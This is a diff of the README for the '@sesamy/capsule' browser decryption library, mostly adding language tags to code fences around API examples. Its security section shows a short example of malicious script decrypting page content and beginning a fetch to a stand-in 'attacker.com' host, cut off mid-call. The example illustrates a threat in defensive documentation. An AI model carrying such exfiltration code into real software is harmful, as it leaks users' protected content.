@@ -12,7 +12,7 @@ npm install @sesamy/capsule
 
 The simplest integration -- auto-detects the issuer and share token, then decrypts and renders everything:
 
-```
+```ts
 import { DcaClient, hasDcaContent } from '@sesamy/capsule';
 
 if (hasDcaContent()) {
@@ -26,7 +26,7 @@ if (hasDcaContent()) {
 
 For more control, use the individual methods:
 
-```
+```ts
 import { DcaClient } from '@sesamy/capsule';
 
 const client = new DcaClient();
@@ -80,7 +80,7 @@ DCA pages contain a single `<script class="dca-manifest">` element holding the v
 
 ## Configuration
 
-```
+```ts
 interface DcaClientOptions {
   // Custom fetch function (e.g. to add auth headers)
   fetch?: typeof globalThis.fetch;
@@ -119,7 +119,7 @@ interface DcaWrapKeyCache {
 
 Parse the DCA manifest (including wrapped ciphertext blocks) from the DOM.
 
-```
+```ts
 const page = client.parsePage();
 // Or from a specific container
 const page = client.parsePage(document.getElementById('article'));
@@ -129,7 +129,7 @@ const page = client.parsePage(document.getElementById('article'));
 
 Parse a DCA manifest from a JSON API response instead of the DOM.
 
-```
+```ts
 const res = await fetch('/api/article/123');
 const page = client.parseJsonResponse(await res.json());
 ```
@@ -138,7 +138,7 @@ const page = client.parseJsonResponse(await res.json());
 
 Request key material from an issuer's unlock endpoint. Pass extra fields (e.g. auth tokens) via `additionalBody`.
 
-```
+```ts
 const keys = await client.unlock(page, 'sesamy', {
   authToken: 'Bearer ...',
 });
@@ -148,7 +148,7 @@ const keys = await client.unlock(page, 'sesamy', {
 
 Decrypt a single content item. Supports both direct content keys and wrap-key delivery.
 
-```
+```ts
 const html = await client.decrypt(page, 'bodytext', keys);
 ```
 
@@ -156,7 +156,7 @@ const html = await client.decrypt(page, 'bodytext', keys);
 
 Decrypt all content items and return a name -> content map.
 
-```
+```ts
 const results = await client.decryptAll(page, keys);
 // { bodytext: '<p>...</p>', sidebar: '<div>...</div>' }
 ```
@@ -165,7 +165,7 @@ const results = await client.decryptAll(page, keys);
 
 Convenience method that combines parse -> unlock -> decryptAll in a single call. Auto-detects the issuer (first key in `manifest.issuers`) and share token (from URL `?share=` parameter) unless overridden:
 
-```
+```ts
 // Simplest usage -- auto-detect everything
 const content = await client.processPage();
 
@@ -182,7 +182,7 @@ const content = await client.processPage({
 
 Inject decrypted content into the DOM. Finds elements with matching `data-dca-content-name` attributes and sets their `innerHTML`. Returns a `Set` of content names that were rendered:
 
-```
+```ts
 const content = await client.processPage();
 const rendered = client.renderToPage(content);
 console.log('Rendered:', [...rendered]); // ['bodytext', 'sidebar']
@@ -192,7 +192,7 @@ console.log('Rendered:', [...rendered]); // ['bodytext', 'sidebar']
 
 Get the user's public key (client-bound mode). Creates keys automatically if they don't exist.
 
-```
+```ts
 const publicKey = await client.getPublicKey();
 // Returns: Base64-encoded SPKI public key
 ```
@@ -201,7 +201,7 @@ const publicKey = await client.getPublicKey();
 
 Check whether the client has an existing RSA key pair stored in IndexedDB.
 
-```
+```ts
 const exists = await client.hasKeyPair();
 ```
 
@@ -209,7 +209,7 @@ const exists = await client.hasKeyPair();
 
 Static method. Checks whether the page (or a given root element) contains DCA content by looking for a `<script class="dca-manifest">` element. Also available as a standalone import:
 
-```
+```ts
 import { hasDcaContent } from '@sesamy/capsule';
 
 if (hasDcaContent()) {
@@ -221,7 +221,7 @@ if (hasDcaContent()) {
 
 Static method. Extract a share token from the current URL query parameters.
 
-```
+```ts
 import { DcaClient, parseShareToken } from '@sesamy/capsule';
 
 // Standalone function (no client instance needed)
@@ -238,7 +238,7 @@ const shareToken = DcaClient.getShareTokenFromUrl('token');
 
 Static method. Extract the `publisher-content-id` attribute from the page.
 
-```
+```ts
 const contentId = DcaClient.getPublisherContentId();
 ```
 
@@ -246,7 +246,7 @@ const contentId = DcaClient.getPublisherContentId();
 
 Watch for dynamically added DCA manifests and auto-process them.
 
-```
+```ts
 const observer = client.observe(document.body);
 // Later: observer.disconnect();
 ```
@@ -259,7 +259,7 @@ The client library provides utilities for working with DCA share link tokens -- 
 
 Call `unlockWithShareToken()` instead of the normal `unlock()`. The share token is included in the unlock request body so the issuer can validate it:
 
-```
+```ts
 import { DcaClient } from '@sesamy/capsule';
 
 const client = new DcaClient();
@@ -283,7 +283,7 @@ if (shareToken) {
 
 `unlockWithShareToken()` is a convenience wrapper around `unlock()`. It adds the `shareToken` field to the unlock request body so the issuer knows to use share-link authorization instead of subscription checks:
 
-```
+```text
 // What unlockWithShareToken sends to the issuer:
 POST /api/unlock
 {
@@ -311,7 +311,7 @@ POST /api/unlock
 
 DCA supports wrap keys -- keyed by `kid` -- that can decrypt content keys locally. Provide a cache to reuse them across page navigations. Entries are stored under `dca:wk:{scope}:{kid}`:
 
-```
+```ts
 // Simple sessionStorage-based cache
 const cache = {
   async get(key: string) {
@@ -337,7 +337,7 @@ await client.decrypt(page2, 'bodytext', keys2); // Uses cached wrapKey
 
 ## React Integration
 
-```
+```tsx
 import { useState, useEffect, useRef } from 'react';
 import { DcaClient, DcaParsedPage } from '@sesamy/capsule';
 
@@ -400,7 +400,7 @@ When `clientBound: true` is enabled, the client generates an RSA-OAEP key pair a
 
 When generating a key pair, the private key is stored with `extractable: false`:
 
-```
+```ts
 const privateKey = await crypto.subtle.importKey(
   'jwk',
   privateKeyJwk,
@@ -421,7 +421,7 @@ This means:
 
 Users and JavaScript code **can access IndexedDB** through DevTools or browser APIs:
 
-```
+```ts
 // You CAN retrieve the key object
 const db = await indexedDB.open('dca-keys');
 const keyPair = await db.get('keypair', 'default');
@@ -458,7 +458,7 @@ The `CryptoKey` object in IndexedDB is just a **handle** or **reference** to the
 
 The **only** attack that works is using the key for its intended purpose:
 
-```
+```ts
 // Malicious code CAN do this:
 const content = await client.processPage();
 await fetch('https://attacker.com', { 
